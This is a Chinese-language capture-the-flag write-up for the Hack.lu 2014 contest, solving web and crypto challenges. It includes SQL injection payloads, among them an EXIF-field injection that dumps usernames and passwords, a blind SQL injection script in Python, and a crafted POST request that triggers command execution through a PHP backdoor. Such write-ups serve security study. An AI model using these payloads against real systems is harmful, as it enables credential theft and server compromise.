@@ -1,0 +1,137 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">Hack.lu 2014 Writeup</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">一个狗</a> <span class="bull">·</span> <time title="2014/10/29 14:55" ui-time="" datetime="2014/10/29 14:55" class="published ng-binding ng-isolate-scope">2014/10/29 14:55</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h2>0x00 Web 50 Encrypted</h2><hr><blockquote><p>Category: Web</p><p>Points: 50</p><p>Author: TheJH</p><p>Description:</p><p>Legend says there is a bank vault in Jamestown which cannot be broken</p><p>into. The only way inside is through an authentication process. Even</p><p>Jesse James and his companions failed to break the security of this</p><p>particular bank. Can you do it?</p><p><a href="https://wildwildweb.fluxfingers.net:1411/">https://wildwildweb.fluxfingers.net:1411/</a></p></blockquote><p>能看到一个登录表单，使用用户名a和密码b登录，看到了链接变成</p><pre><code>https://wildwildweb.fluxfingers.net:1411/dologin.php?dhrel=FRYRPG+%60anzr%60+SEBZ+%60hfref%60+JURER+%60anzr%60+%3D+%27n%27+NAQ+%60cnffjbeq%60+%3D+ZQ5%28%27o%27%29
+</code></pre><hr><pre><code>#!bash
+In [22]: hackercodecs.rotx(hackercodecs.urlunquote(a),13)
+Out[22]: u"query=SELECT+`name`+FROM+`users`+WHERE+`name`+=+'a'+AND+`password`+=+MD5('b')"
+</code></pre><p>去掉后半部分，直接访问：</p><pre><code>#!bash
+DeAdCaT___$ curl 'https://wildwildweb.fluxfingers.net:1411/dologin.php?dhrel=FRYRPG%20%60anzr%60%20SEBZ%20%60hfref%60'
+</code></pre><hr><pre><code>#!html
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+  &lt;head&gt;
+    &lt;title&gt;Encrypted Login&lt;/title&gt;
+  &lt;/head&gt;
+  &lt;body&gt;
+    &lt;h1&gt;Encrypted Login&lt;/h1&gt;
+Hello admin! The flag is flag{nobody_needs_server_side_validation}.  &lt;/body&gt;
+&lt;/html&gt;
+</code></pre><h2>0x01 Web 200 ImageUpload</h2><hr><blockquote><p>Category: Web Points: 200 Author: SLAZ Description: In the Wild Wild Web, there are really bad guys. The sheriff doesn’t know them all.</p><p>Therefore, he needs your help. Upload pictures of criminals to this site and help the sheriff to arrest them. You can make this Wild Wild Web much less wild!!! Pictures will be deleted on regular basis! Hint: Bruteforce is not necessary to solve the challenge!!! Please don’t do this. https://wildwildweb.fluxfingers.net:1421/</p></blockquote><p>当你登录之后，你能看到一个上传图片的表单和一个Login，上传了一个小辣椒之后，服务器生成了这么一个图片，并且下方还有一个表格。</p><p><img alt="enter image description here" img-src="cd0797d1ebde3a29c049f5151024e5882bce05bb.jpg"></p><p>我一开始总觉得是要绕过gd的压缩，在各种调教之前的一个绕过gd压缩的代码。后来这个题被凯神秒了，他说这是个exif注入。</p><p>于是后来玩了一下，用exiftool。</p><p>最终的payload图片的部分exif信息</p><pre><code>#!bash
+DeAdCaT-2:hack.lu2014 DeAdCaT___$ exiftool test.jpg
+ExifTool Version Number         : 9.60
+File Name                       : test.jpg
+Directory                       : .
+File Size                       : 7.2 kB
+Artist                          : asd','nidaye',(select group_concat(id,0x3a,name,0x3a,password) from users)) #
+</code></pre><p>在Model处出现数据：</p><pre><code>#!bash
+1:sheriff:AO7eikkOCucCFJOyyaaQ,2:deputy:testpw
+</code></pre><p>然后Login，获得fLag。</p><pre><code>You are sucessfully logged in.
+Flag: flag{1_5h07_7h3_5h3r1ff}
+</code></pre><h2>0x02 Crypto 150 Hidden in ρlaιn sιght</h2><hr><blockquote><p>Category: Crypto</p><p>Points: 150</p><p>Author: TheJH</p><p>Description: At our software development company, one of the top developers left in anger. He told us that he had hidden a backdoor in our node.js server application — he thinks that we can’t find it even if we try. I have attached the source code of our fileserver. After registration, you can log in, upload files and create access tokens for your files that others can use to retrieve them. He must have added some way to retrieve files without permission. And we don’t have version control, so we can’t just check his last commits. We have read the source code multiple times, but just can’t figure out how he did it. Maybe he just lied? Can you help us and demonstrate how the backdoor works? We have uploaded a file to testuser/files/flag.txt – please try to retrieve it. Connect to https://wildwildweb.fluxfingers.net:1409/. Note that all your files will be purged every 5 minutes. You can download the service code here: Download</p></blockquote><p>一开始以为是密码题，后来发现是隐写。。。。（机智的lym</p><p>一个图片说明问题：</p><p><img alt="enter image description here" img-src="5eaf75ab69e3f3701953bfac5ef5c35d98821463.jpg"></p><h2>0x03 crypto150</h2><hr><p>下面那个长的像拉长的E的东西是</p><pre><code>\u0395
+</code></pre><p>也就是说：</p><pre><code>HMAC_SECRET = ''
+</code></pre><p>用python：</p><pre><code>#!bash
+In [76]: hmac.new('','testuser/flag.txt',hashlib.sha256).hexdigest()
+Out[76]: '4a332c7f27909f85a529393cea72301393f84cf5908aa2538137776f78624db4'
+DeAdCaT___$ curl https://wildwildweb.fluxfingers.net:1409/files/testuser/flag.txt/4a332c7f27909f85a529393cea72301393f84cf5908aa2538137776f78624db4
+flag{unicode_stego_is_best_stego}
+</code></pre><h2>0x04 Web 200 Killy The Bit</h2><hr><blockquote><p>Category: Web</p><p>Points: 200</p><p>Author: understrich</p><p>Description: Killy the Bit is one of the dangerous kittens of the wild west. He already flipped bits in most of the states and recently hacked the Royal Bank of Fluxembourg (https://wildwildweb.fluxfingers.net:1424/). All customer of the bank are now advised to change their password for the next release of the bank’s website which will be launched on the 23.10.2014 10:01 CEST. Killy the Bit stands in your debt and sent the following link https://wildwildweb.fluxfingers.net:1424/index.phps. Can you break the password generation process in order to get access to the admin account? Hint: The challenge won’t actually send emails — just concentrate on the website! Hint: The password’s column name is passwd. Hint: Blind SQLi is not a good solution. You can get the correct and complete flag with one single request!</p></blockquote><p>狗我比较弱，用的盲注：</p><pre><code>#!python
+import requests
+
+def binary_sqli(left, right, index):
+    while 1:
+        mid = (left + right)/2
+        if mid == left:
+            print chr(mid)
+            return chr(mid)
+            break
+        payload = "' union select name,email from user where name = if(ascii(substr((select passwd from user where name='admin'),%s,1))&lt;%s,'admin','root')%%23" % (str(index), str(mid))
+        url = 'https://wildwildweb.fluxfingers.net:1424/?name=' + payload + '&amp;submit=Generate'
+        r = requests.get(url)
+        tmp = r.text
+        if len(tmp) &lt; 480:
+            right = mid
+        else:
+            left = mid
+
+if __name__ == '__main__':
+    ans = ''
+    for i in range(1,65):
+        ans += binary_sqli(35, 127, i)
+    print ans
+</code></pre><p>拿到了flag：</p><pre><code>flag{Killy_The_Bit_Is_Wanted_for_9000_$$_FoR_FlipPing_Bits}
+</code></pre><p>更优雅的一句话get flag：</p><pre><code>#!bash
+DeAdCaT___$ http https://wildwildweb.fluxfingers.net:1424/?name=adm%27%20UNION%20select%20passwd,2%20from%20user%20where%20name=%27admin%27%20LIMIT%201,2%23&amp;submit=Generate#
+[1] 49939
+DeAdCaT-2:longest-common-prefix DeAdCaT___$ HTTP/1.1 200 OK
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Connection: keep-alive
+Content-Encoding: gzip
+Content-Type: text/html; charset=UTF-8
+Date: Tue, 28 Oct 2014 08:31:24 GMT
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Pragma: no-cache
+Server: nginx
+Set-Cookie: PHPSESSID=qk9aod6reqkf8f2c17qhdo1dl2; path=/
+Transfer-Encoding: chunked
+X-Powered-By: PHP/5.5.9-1ubuntu4.4
+
+&lt;html&gt;&lt;head&gt;&lt;style type='text/css'&gt;&lt;!-- body {background-image: url(bg.jpg);background-repeat: no-repeat;height: Percent;width: Percent; background-size: cover;}//--&gt;&lt;/style&gt; &lt;title&gt;Royal Bank of Fluxembourg&lt;/title&gt;&lt;/head&gt;&lt;/html&gt;&lt;!--
+Single cows are waiting for you
+
+_____________________
+|I'm a hot single cow!| 
+--------------------- 
+\   ^__^  
+\  (oo)\_______ 
+(__)\       )\/\ 
+||----w | 
+||     || 
+
+
+--&gt;We couldn't find your username, but it sounds like this user:&lt;br&gt;flag{Killy_The_Bit_Is_Wanted_for_9000_$$_FoR_FlipPing_Bits}&lt;br&gt;
+</code></pre><p>SQL语句不够溜啊QAQ</p><h2>0x05 Web 200 Next Global Backdoor</h2><hr><blockquote><p>Category: Web</p><p>Points: 150</p><p>Author: reiners</p><p>Description: J0nas is a simple man. He specializes in only one thing: Building the most beautiful back doors that you’ve ever seen. This gem was used in multiple saloons, letting only the most skilled c0wb0ys pass. https://wildwildweb.fluxfingers.net:1425/index.php index.phps</p></blockquote><pre><code>#!php
+&lt;?php 
+
+    $v1 = next(neXt(${'next'}['next']))
+    // step 1
+    // @$GLOBALS=$GLOBALS{next}=next($GLOBALS{'GLOBALS'})[$GLOBALS['next']['next']=next($GLOBALS)['GLOBALS']][$next['GLOBALS']=next($GLOBALS[GLOBALS]['GLOBALS'])[$next['next']]][$next['GLOBALS']=next($next['GLOBALS'])][$GLOBALS[next]['next']($GLOBALS['next']{'GLOBALS'})]=$v1;
+    // step 2 globals next += 1
+    //@$GLOBALS=$GLOBALS{next}=$_POST[$GLOBALS['next']['next']=next($GLOBALS)['GLOBALS']][$next['GLOBALS']=next($GLOBALS[GLOBALS]['GLOBALS'])[$next['next']]][$next['GLOBALS']=next($next['GLOBALS'])][$GLOBALS[next]['next']($GLOBALS['next']{'GLOBALS'})]=$v1;
+    // step 3 globals next += 1
+    // $v2 = $next['next']=$_COOKIE['GLOBALS'];
+    // @$GLOBALS=$GLOBALS{next}=$_POST[$v2][$next['GLOBALS']=next($GLOBALS[GLOBALS]['GLOBALS'])[$next['next']]][$next['GLOBALS']=next($next['GLOBALS'])][$GLOBALS[next]['next']($GLOBALS['next']{'GLOBALS'})]=$v1;
+    // step 4 globals next += 1
+    // $GLOBALS[GLOBALS]['GLOBALS'] = $GLOBALS
+    // $v2 = $next['next']=$_COOKIE['GLOBALS'];
+    // $v3 = $next['GLOBALS']=$_FILES[$v2]
+    // @$GLOBALS=$GLOBALS{next}=$_POST[$v2][$v3][$next['GLOBALS']=next($next['GLOBALS'])][$GLOBALS[next]['next']($GLOBALS['next']{'GLOBALS'})]=$v1;
+    // step 5 
+    // $v2 = $next['next']=$_COOKIE['GLOBALS'];
+    // $v3 = $next['GLOBALS']=$_FILES[$v2];
+    // next($_FILE) = $_FILES[$v2]['type']
+    // $v4 = $next['GLOBALS']=$_FILES[$v2]['type'];
+    // @$GLOBALS=$GLOBALS{next}=$_POST[$v2][$v3][$v4][$GLOBALS[next]['next']($GLOBALS['next']{'GLOBALS'})]=$v1;
+    // step 6
+    $v2 = $next['next']=$_COOKIE['GLOBALS'];
+    $v3 = $next['GLOBALS']=$_FILES[$v2];
+    $v4 = $next['GLOBALS']=$_FILES[$v2]['type'];
+    @$GLOBALS=$GLOBALS{next}=$_POST[$v2][$v3][$v4][$_COOKIE['GLOBALS']($_FILES[$v2]['type'])]=$v1;
+
+?&gt;
+</code></pre><p>构造数据包：</p><pre><code>#!bash
+POST /index.php HTTP/1.1
+Host: wildwildweb.fluxfingers.net:1425
+Content-Length: 1325
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryePkpFF7tjBAqx29L
+Cookie: GLOBALS=system
+
+------WebKitFormBoundaryePkpFF7tjBAqx29L
+Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+100000
+------WebKitFormBoundaryePkpFF7tjBAqx29L
+Content-Disposition: form-data; name="ls"; filename="hello.o"
+Content-Type: ls
+
+&lt;file data&gt;
+------WebKitFormBoundaryePkpFF7tjBAqx29L———
+</code></pre><p>最后cat /flag.txt即可。</p><pre><code>flag{backdoor_business_is_hard,_fella}
+</code></pre><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">BeenQuiver</span> <span class="reply-time">2016-05-09 10:11:11</span></div><p></p><p>掉渣天了噜,666</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">pack_rat</span> <span class="reply-time">2014-12-03 16:42:21</span></div><p></p><p>猫流大大好</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">一个狗</span> <span class="reply-time">2014-11-01 21:54:17</span></div><p></p><p>没0 0</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">一个狗</span> <span class="reply-time">2014-11-01 21:53:58</span></div><p></p><p>hi 涛神</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">一个狗</span> <span class="reply-time">2014-11-01 21:53:36</span></div><p></p><p>233</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">lightless</span> <span class="reply-time">2014-10-30 07:44:37</span></div><p></p><p>猫总好~</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Matt</span> <span class="reply-time">2014-10-29 15:42:24</span></div><p></p><p>你的名字牛逼!</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Kuuki</span> <span class="reply-time">2014-10-29 15:32:59</span></div><p></p><p>卢森堡这个有线下赛吗o_0</p><p></p></div></div></div></div></div></main>
